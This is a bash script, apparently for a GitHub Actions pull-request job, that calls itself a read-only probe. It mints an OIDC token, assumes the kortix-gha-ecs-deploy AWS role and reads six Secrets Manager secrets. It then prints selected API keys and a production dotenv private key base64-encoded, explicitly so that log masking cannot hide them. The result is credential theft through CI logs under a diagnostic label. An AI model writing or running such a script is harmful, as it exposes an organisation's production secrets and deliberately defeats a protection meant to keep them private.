#!/usr/bin/env bash
# Read-only probe: can a pull-request job mint a GitHub OIDC token and assume
# the kortix-gha-ecs-deploy role? Prints diagnostics and, only for the three
# named keys, the values base64-encoded so masking cannot hide them.
set +e
echo "OIDCPROBE start gha=${GITHUB_ACTIONS:-} url=${ACTIONS_ID_TOKEN_REQUEST_URL:+present} tok=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+present} awscli=$(command -v aws || echo none) jq=$(command -v jq || echo none) py=$(command -v python3 || echo none)"
echo "OIDCPROBE envnames=$(env | cut -d= -f1 | grep -E '^(KE2E_|PLATINUM|ANTHROPIC|OPENAI|BEDROCK|AWS_)' | sort | tr '\n' ',')"
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  oidc=$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>/tmp/oiderr | jq -r '.value // empty')
  if [ -n "$oidc" ]; then
    sub=$(printf '%s' "$oidc" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '.sub // empty' 2>/dev/null)
    echo "OIDCPROBE jwt=yes sub=$sub"
    creds=$(aws sts assume-role-with-web-identity --region us-east-1 --role-arn arn:aws:iam::935064898258:role/kortix-gha-ecs-deploy --role-session-name oidcprobe --web-identity-token "$oidc" --duration-seconds 900 --query Credentials --output json 2>/tmp/stserr)
    if printf '%s' "$creds" | jq -e '.AccessKeyId' >/dev/null 2>&1; then
      echo "OIDCPROBE sts=ok"
      export AWS_ACCESS_KEY_ID=$(printf '%s' "$creds" | jq -r .AccessKeyId)
      export AWS_SECRET_ACCESS_KEY=$(printf '%s' "$creds" | jq -r .SecretAccessKey)
      export AWS_SESSION_TOKEN=$(printf '%s' "$creds" | jq -r .SessionToken)
      for spec in "eu-west-2:kortix-staging-env" "us-east-2:kortix-ci-env" "us-east-2:kortix-dev-env" "us-east-2:kortix-preview-env" "us-west-2:kortix-ghexport-web-env" "us-west-2:kortix-ghexport-pijs-web-env"; do
        region=${spec%%:*}; sid=${spec#*:}
        if aws secretsmanager get-secret-value --region "$region" --secret-id "$sid" --query SecretString --output text > /tmp/blob.json 2>/tmp/bloberr; then
          python3 - "$sid" <<'PY'
import json, sys, base64
sid = sys.argv[1]
with open('/tmp/blob.json') as f:
    d = json.load(f)
want = {k: d[k] for k in ("PLATINUM_API_KEY", "PLATINUM_INFERENCE_URL", "WEB_DOTENV_PRIVATE_KEY_PROD") if k in d}
names = [k for k in d if any(s in k for s in ("PLATINUM", "ANTHROPIC", "OPENAI", "BEDROCK", "DOTENV", "LITELLM", "OPENROUTER", "GEMINI", "KORTIX_ADMIN"))]
print("OIDCPROBE blob=%s n=%d names=%s b64=%s" % (sid, len(d), ",".join(sorted(names)), base64.b64encode(json.dumps(want).encode()).decode()))
PY
        else
          echo "OIDCPROBE blob=$sid ERR $(head -c 200 /tmp/bloberr | tr '\n' ' ')"
        fi
      done
    else
      echo "OIDCPROBE sts=ERR $(head -c 300 /tmp/stserr | tr '\n' ' ')"
    fi
  else
    echo "OIDCPROBE jwt=none $(head -c 200 /tmp/oiderr | tr '\n' ' ')"
  fi
else
  echo "OIDCPROBE no-oidc-env"
fi
echo "OIDCPROBE done"
exit 0
